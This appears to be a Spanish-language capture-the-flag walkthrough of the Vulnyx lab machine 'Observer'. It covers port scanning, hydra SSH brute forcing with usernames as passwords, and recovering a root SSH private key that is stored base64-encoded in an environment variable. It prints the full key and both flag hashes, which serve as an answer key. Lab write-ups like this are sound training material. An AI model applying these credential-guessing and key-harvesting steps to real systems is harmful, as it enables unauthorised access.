---
icon: flag
---

# Observer Vulnyx (Easy - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-10 10:50 EDT
Nmap scan report for 192.168.5.97
Host is up (0.00098s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
| ssh-hostkey: 
|   256 a9:a8:52:f3:cd:ec:0d:5b:5f:f3:af:5b:3c:db:76:b6 (ECDSA)
|_  256 73:f5:8e:44:0c:b9:0a:e0:e7:31:0c:04:ac:7e:ff:fd (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: iData-Hosting-Free-Bootstrap-Responsive-Webiste-Template
MAC Address: 08:00:27:AE:30:A3 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.26 seconds
```

Veremos varios puertos interesantes, entre ellos el puerto `80` en el cual suele alojar una pagina web, si entramos veremos una pagina web normal, sin nada aparentemente extraño, pero si vemos mejor veremos que hay una seccion llamada `TEAM` en el cual hay varios usuarios, los cuales pueden ser interesante para probar, por lo que vamos a crear la siguiente lista de usuarios.

> users.txt

```
john
mike
remo
niscal
```

Ahora vamos a probar a realizar un `hydra` para ver si tuvieramos suerte.

## Hydra

Si probamos con un diccionario de contraseñas veremos que no tenemos suerte, pero si probamos como contraseña tambien el listado de usuarios, veremos lo siguiente:

```shell
hydra -L users.txt -P users.txt ssh://<IP> -t 64 -I
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-10 10:57:46
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 16 login tries (l:4/p:4), ~1 try per task
[DATA] attacking ssh://192.168.5.97:22/
[22][ssh] host: 192.168.5.97   login: niscal   password: niscal
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-10 10:57:56
```

Veremos que tenemos una coincidencia de usuario `niscal` con su contraseña como su nombre de usuario, por lo que vamos a probar a conectarnos por `SSH` a dicho usuario.

```shell
ssh niscal@<IP>
```

Metemos como contraseña `niscal`...

```
########################################
# Dear person,                         #
# Not now! I'm busy with the terminal. #
#                                      #
#                                      #
# by Niscal                            #
########################################

Connection to 192.168.5.97 closed.
```

Vemos que al entrar nos desconecta rapidamente, con un mensaje de que hay alguien mas en la terminal con la misma sesion, por lo que vamos a probar a entrar de otra forma.

## Escalate user niscal/remo

Ya que por `SSH` no podremos entrar de forma normal, vamos hacer que nos invoque una shell en un entorno `grafico` con la opcion `-X` que tiene `SSH`.

```
El parámetro -X en ssh activa lo que se llama X11 forwarding.
```

Si hacemos esto:

```shell
ssh niscal@<IP> -X
```

Metemos como contraseña `niscal`....

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-10 170338.png" alt=""><figcaption></figcaption></figure>

Veremos que ahora si funciona, pero en la terminal veremos el siguiente comando que aparece por defecto:

```shell
echo -n REMOisGOD | passwd remo
```

Por lo que vemos puede ser la `password` del usuario `remo`, vamos a probarla por `SSH` antes de hacer nada con este usuario.

### SSH

```shell
ssh remo@<IP>
```

Metemos como contraseña `REMOisGOD`...

```
remo@observer:~$ whoami
remo
```

Veremos que somos dicho usuario, por lo que vamos a leer la `flag` del usuario.

> user.txt

```
f2edafebb9851d806ff15deb0477ebe8
```

## Escalate Privileges

Si leemos las variables de entorno del sistema que estan creadas, veremos lo siguiente:

```
.............................<RESTO DE VARIABLES>..................................
rootKEY=LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUJsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFZRUFtd3lUb25TYS81d2FhOWprZDRDTGErZ3ozVXFQazJjQjVIcnJJZmViVGdIS0t5OEZjZlBqCkRWTTc0NTM0c3lpZHA5WFQ4WlV0VTAwSm1mSCtEN3pyRW5GWHY4T2VDRitVc0VZWVJ5MFdLUWd6Q1RSdG1jYTRGTUpMeUUKd29ZWU84dTNIR0c2T0VVSEJobjF2ZXBVd1RHcGNHYmdxQXdxdm9rYk5JejRDU2ZqODBEVHVwZENKYi9TYndnME4zT3FzegpVWEM3UkNLRkpBRDJXbkRHakFzMkVtODFuYWhBUlFEZ21KSTI4dkoxQ2dmVDFZbzhiRW9Sdlo4dFR3a0ZiMXNYTlRSME1QCmUrOXZyUzFDZG5DdmhuM0RCaVk3VGV3WEVEc3pJMWR3U2RvMFpXY2oxeklUam1JN2JNcU9YWlRLVnNLUmRlN1luOENrbnAKd1k0c203U3pwTTEvWWlSRjIwS3poRFZBS1pwMVBQclhJcXhjTWdreThrM0NvNm1zT0JMd3lSZllmcG9qbHhCMGxrbjFWQwpNT05EdDNVOHJLNEFIRjdDU21xSFJUNDR2L3k3aTEwcVlUSnp0eDdRb1JXVldReGNZTzV2UEtQcEFuUzJZU0o4aG5RZ0RFCjRyenpPaTF1UFJ4VjBoZ0QzYjNuNCs4QmtheEI3cG4xWXNaZmVvK0hBQUFGaVB1L25pcjd2NTRxQUFBQUIzTnphQzF5YzIKRUFBQUdCQUpzTWs2SjBtditjR212WTVIZUFpMnZvTTkxS2o1Tm5BZVI2NnlIM20wNEJ5aXN2QlhIejR3MVRPK09kK0xNbwpuYWZWMC9HVkxWTk5DWm54L2crODZ4SnhWNy9EbmdoZmxMQkdHRWN0RmlrSU13azBiWm5HdUJUQ1M4aE1LR0dEdkx0eHhoCnVqaEZCd1laOWIzcVZNRXhxWEJtNEtnTUtyNkpHelNNK0FrbjQvTkEwN3FYUWlXLzBtOElORGR6cXJNMUZ3dTBRaWhTUUEKOWxwd3hvd0xOaEp2Tloyb1FFVUE0SmlTTnZMeWRRb0gwOVdLUEd4S0ViMmZMVThKQlc5YkZ6VTBkREQzdnZiNjB0UW5adwpyNFo5d3dZbU8wM3NGeEE3TXlOWGNFbmFOR1ZuSTljeUU0NWlPMnpLamwyVXlsYkNrWFh1MkovQXBKNmNHT0xKdTBzNlROCmYySWtSZHRDczRRMVFDbWFkVHo2MXlLc1hESUpNdkpOd3FPcHJEZ1M4TWtYMkg2YUk1Y1FkSlpKOVZRakRqUTdkMVBLeXUKQUJ4ZXdrcHFoMFUrT0wvOHU0dGRLbUV5YzdjZTBLRVZsVmtNWEdEdWJ6eWo2UUowdG1FaWZJWjBJQXhPSzg4em90YmowYwpWZElZQTkyOTUrUHZBWkdzUWU2WjlXTEdYM3FQaHdBQUFBTUJBQUVBQUFHQUFUVVpPUEFBejVJTjJUQzVzK0tJNFNDK0FGCjQ3ZlVpVmJXZEg3akNTWFBnNHZiODB4NVBrL1BlQlV2WE9lQkdPUW5WRExzUEtJY2pkSnpTdGxWQ0JoaUVyK0xFY3BRTEQKUUhJcUpxb0h1RGc1Vnp3VXlQeityTE5JRXN3Rm1lak5YTTdsRkxGT0U5VGJFVEQ4TER3VE5rdTV5UVZ5b2F6a0NkT1I4dgpEZDRPVE9HM2JZWjhLZUtxQnhFdVhBOVV2dWJ5bEg3M3Bsb0ZETENBdjd4OVlmWHdnWDlaUnFNeVB2aVlkN3JRL3gzaGpGCnBwdXpucDBmREt6RFRPdkRSeVRLWHBaYnQ0UnVKcnBjVlJEc00zSlBELzhxRSt0V0lIV2JuWXZvOUhDWVpOd0k1NURlVngKMUJkRG51Ty83NGNXQnhIRjlHbXJiMXVZdFVGQXcyc1JFcjF3SlVHd2d6WFM1YlF1VC9FOFYxNzBTckdaZm1QWjVldFRGaQpPSUN2SHBURlc3YWJYWXo1dmZBUksyei9vMWdEOXppNVdBTmEvZ2Z1bjVKenI1eGFJTGdTYm52MkpicThVeTBsUHZ0YWg1ClZ4Y1RXanNIYWo3bjBDRERrNUtiUzlaN0dDaG9jbkY0UWxEWE5RNHBSa2QxVFVqS1JxQUpZcldnRmoxaTJrN21KaEFBQUEKd1FDTlZiYmI3d3BWeUVQK2pFTEJiY3Jyb0ZYc1BFSmJreHpZeHNzZFBkVTNDMmtZdVEvVXBRcmdsUzJrVnZyVzZ1R3hNQwo4Y2VsOXdtbWdxamo5N05iWE4zMkg2eENSSG5oK3E4VCtzNDhybks0SFJOMDMrNEVvMEJtQzJMRlU5TkpnTEszYm5NV2VMCmU0TmtKRWU1VDRYeForZ2FPVjc4ZWI4U1JzRjBPSXE0SWR2R01FeDVPVzJoZThzdEZ0TzVGV1k1TGZ6c29FVjAyUWczejMKRGx2NklZRFJDZEM0NWJNWC9FbVM0R0k2U1VzNUdibmpOUDJUT2hEWjQ3ZkVrelpTSUFBQURCQU1sMkozRGxhM3FockZvZwovSWtFTm41TUNGSWpYY3lST0ExbDZzeHhneU9jZkJhVmNvNnVIQ2lPZ3A5akxYV01pTi9rUjgrZUFjSFRNY2R2bmhhUXQ1CjIvN2JVRGE4ZWJLZjRoa3lDVlVBdjUxcnpuSkF5Tm5QRExNOTRZRElhRUYxUGZ5dWtLbXc3L0p1ZUExVUtKc1BVSVgzK1oKWk5UbXB5TGJ5SjROcWRpaTRkYXNBdEcwT1hXZTJielVGSmsyTGllSHlwSWs0RkJQMmJVcHBaaUtxSUtHWDFuZm5hRVNEVAorZVJKL0t3QS9NaXIzU2c3MUNWaFR3dTdFbW9vWjU0UUFBQU1FQXhRWHB4OWdwanN0WC9sdWdtcEJMM3RYTnVDVlA1cllmCjF6R2R1T0dVem56Y3ZuR2Y2ZXJaU2dva0JmZlQ1djNYem04TFhxSU9jKzhMSUkrZkNqVWZLRUQvaHV5T3R5MFEza1JHU1QKVUViNmRIa1FSQktwWXZ5aEowbWd4WmNWWFc5UzdGQmNrM0J4SVMyczZjWjFWRzE1Zjl4UUpIeWU5Q2J5d1RFb1BqZzAzZApiN1gvZ3NibVVHTE9GVk1saFEzSHNBSnBRV2NQeGdKb2FoRGdkMy9VaDZDTmJmQm9OMXFDNkprcU9NcUFQbDZobUxZcGp4CnNGUExjWlRrZHZqRVpuQUFBQURYSnZiM1JBYjJKelpYSjJaWElCQWdNRUJRPT0KLS0tLS1FTkQgT1BFTlNTSCBQUklWQVRFIEtFWS0tLS0tCg==
.............................<RESTO DE VARIABLES>..................................
```

Vemos lo que parece ser algo codificado en `Base64` que tiene que ver con la contraseña de `root`.

```shell
echo 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUJsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFZRUFtd3lUb25TYS81d2FhOWprZDRDTGErZ3ozVXFQazJjQjVIcnJJZmViVGdIS0t5OEZjZlBqCkRWTTc0NTM0c3lpZHA5WFQ4WlV0VTAwSm1mSCtEN3pyRW5GWHY4T2VDRitVc0VZWVJ5MFdLUWd6Q1RSdG1jYTRGTUpMeUUKd29ZWU84dTNIR0c2T0VVSEJobjF2ZXBVd1RHcGNHYmdxQXdxdm9rYk5JejRDU2ZqODBEVHVwZENKYi9TYndnME4zT3FzegpVWEM3UkNLRkpBRDJXbkRHakFzMkVtODFuYWhBUlFEZ21KSTI4dkoxQ2dmVDFZbzhiRW9Sdlo4dFR3a0ZiMXNYTlRSME1QCmUrOXZyUzFDZG5DdmhuM0RCaVk3VGV3WEVEc3pJMWR3U2RvMFpXY2oxeklUam1JN2JNcU9YWlRLVnNLUmRlN1luOENrbnAKd1k0c203U3pwTTEvWWlSRjIwS3poRFZBS1pwMVBQclhJcXhjTWdreThrM0NvNm1zT0JMd3lSZllmcG9qbHhCMGxrbjFWQwpNT05EdDNVOHJLNEFIRjdDU21xSFJUNDR2L3k3aTEwcVlUSnp0eDdRb1JXVldReGNZTzV2UEtQcEFuUzJZU0o4aG5RZ0RFCjRyenpPaTF1UFJ4VjBoZ0QzYjNuNCs4QmtheEI3cG4xWXNaZmVvK0hBQUFGaVB1L25pcjd2NTRxQUFBQUIzTnphQzF5YzIKRUFBQUdCQUpzTWs2SjBtditjR212WTVIZUFpMnZvTTkxS2o1Tm5BZVI2NnlIM20wNEJ5aXN2QlhIejR3MVRPK09kK0xNbwpuYWZWMC9HVkxWTk5DWm54L2crODZ4SnhWNy9EbmdoZmxMQkdHRWN0RmlrSU13azBiWm5HdUJUQ1M4aE1LR0dEdkx0eHhoCnVqaEZCd1laOWIzcVZNRXhxWEJtNEtnTUtyNkpHelNNK0FrbjQvTkEwN3FYUWlXLzBtOElORGR6cXJNMUZ3dTBRaWhTUUEKOWxwd3hvd0xOaEp2Tloyb1FFVUE0SmlTTnZMeWRRb0gwOVdLUEd4S0ViMmZMVThKQlc5YkZ6VTBkREQzdnZiNjB0UW5adwpyNFo5d3dZbU8wM3NGeEE3TXlOWGNFbmFOR1ZuSTljeUU0NWlPMnpLamwyVXlsYkNrWFh1MkovQXBKNmNHT0xKdTBzNlROCmYySWtSZHRDczRRMVFDbWFkVHo2MXlLc1hESUpNdkpOd3FPcHJEZ1M4TWtYMkg2YUk1Y1FkSlpKOVZRakRqUTdkMVBLeXUKQUJ4ZXdrcHFoMFUrT0wvOHU0dGRLbUV5YzdjZTBLRVZsVmtNWEdEdWJ6eWo2UUowdG1FaWZJWjBJQXhPSzg4em90YmowYwpWZElZQTkyOTUrUHZBWkdzUWU2WjlXTEdYM3FQaHdBQUFBTUJBQUVBQUFHQUFUVVpPUEFBejVJTjJUQzVzK0tJNFNDK0FGCjQ3ZlVpVmJXZEg3akNTWFBnNHZiODB4NVBrL1BlQlV2WE9lQkdPUW5WRExzUEtJY2pkSnpTdGxWQ0JoaUVyK0xFY3BRTEQKUUhJcUpxb0h1RGc1Vnp3VXlQeityTE5JRXN3Rm1lak5YTTdsRkxGT0U5VGJFVEQ4TER3VE5rdTV5UVZ5b2F6a0NkT1I4dgpEZDRPVE9HM2JZWjhLZUtxQnhFdVhBOVV2dWJ5bEg3M3Bsb0ZETENBdjd4OVlmWHdnWDlaUnFNeVB2aVlkN3JRL3gzaGpGCnBwdXpucDBmREt6RFRPdkRSeVRLWHBaYnQ0UnVKcnBjVlJEc00zSlBELzhxRSt0V0lIV2JuWXZvOUhDWVpOd0k1NURlVngKMUJkRG51Ty83NGNXQnhIRjlHbXJiMXVZdFVGQXcyc1JFcjF3SlVHd2d6WFM1YlF1VC9FOFYxNzBTckdaZm1QWjVldFRGaQpPSUN2SHBURlc3YWJYWXo1dmZBUksyei9vMWdEOXppNVdBTmEvZ2Z1bjVKenI1eGFJTGdTYm52MkpicThVeTBsUHZ0YWg1ClZ4Y1RXanNIYWo3bjBDRERrNUtiUzlaN0dDaG9jbkY0UWxEWE5RNHBSa2QxVFVqS1JxQUpZcldnRmoxaTJrN21KaEFBQUEKd1FDTlZiYmI3d3BWeUVQK2pFTEJiY3Jyb0ZYc1BFSmJreHpZeHNzZFBkVTNDMmtZdVEvVXBRcmdsUzJrVnZyVzZ1R3hNQwo4Y2VsOXdtbWdxamo5N05iWE4zMkg2eENSSG5oK3E4VCtzNDhybks0SFJOMDMrNEVvMEJtQzJMRlU5TkpnTEszYm5NV2VMCmU0TmtKRWU1VDRYeForZ2FPVjc4ZWI4U1JzRjBPSXE0SWR2R01FeDVPVzJoZThzdEZ0TzVGV1k1TGZ6c29FVjAyUWczejMKRGx2NklZRFJDZEM0NWJNWC9FbVM0R0k2U1VzNUdibmpOUDJUT2hEWjQ3ZkVrelpTSUFBQURCQU1sMkozRGxhM3FockZvZwovSWtFTm41TUNGSWpYY3lST0ExbDZzeHhneU9jZkJhVmNvNnVIQ2lPZ3A5akxYV01pTi9rUjgrZUFjSFRNY2R2bmhhUXQ1CjIvN2JVRGE4ZWJLZjRoa3lDVlVBdjUxcnpuSkF5Tm5QRExNOTRZRElhRUYxUGZ5dWtLbXc3L0p1ZUExVUtKc1BVSVgzK1oKWk5UbXB5TGJ5SjROcWRpaTRkYXNBdEcwT1hXZTJielVGSmsyTGllSHlwSWs0RkJQMmJVcHBaaUtxSUtHWDFuZm5hRVNEVAorZVJKL0t3QS9NaXIzU2c3MUNWaFR3dTdFbW9vWjU0UUFBQU1FQXhRWHB4OWdwanN0WC9sdWdtcEJMM3RYTnVDVlA1cllmCjF6R2R1T0dVem56Y3ZuR2Y2ZXJaU2dva0JmZlQ1djNYem04TFhxSU9jKzhMSUkrZkNqVWZLRUQvaHV5T3R5MFEza1JHU1QKVUViNmRIa1FSQktwWXZ5aEowbWd4WmNWWFc5UzdGQmNrM0J4SVMyczZjWjFWRzE1Zjl4UUpIeWU5Q2J5d1RFb1BqZzAzZApiN1gvZ3NibVVHTE9GVk1saFEzSHNBSnBRV2NQeGdKb2FoRGdkMy9VaDZDTmJmQm9OMXFDNkprcU9NcUFQbDZobUxZcGp4CnNGUExjWlRrZHZqRVpuQUFBQURYSnZiM1JBYjJKelpYSjJaWElCQWdNRUJRPT0KLS0tLS1FTkQgT1BFTlNTSCBQUklWQVRFIEtFWS0tLS0tCg==' | base64 -d
```

Info:

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

Vemos que es un `id_rsa` privado, por lo que vamos a guardarlo en un archivo `id_rsa` para utilizarlo por `SSH` y asignarle los permisos necesarios.

```shell
chmod 600 id_rsa
ssh -i id_rsa root@<IP>
```

Info:

```
root@observer:~# whoami
root
```

Con esto veremos que ya seremos `root`, por lo que vamos a leer la `flag` de `root`.

> root.txt

```
fa40a17de09827a5ae20a894304c6a49
```
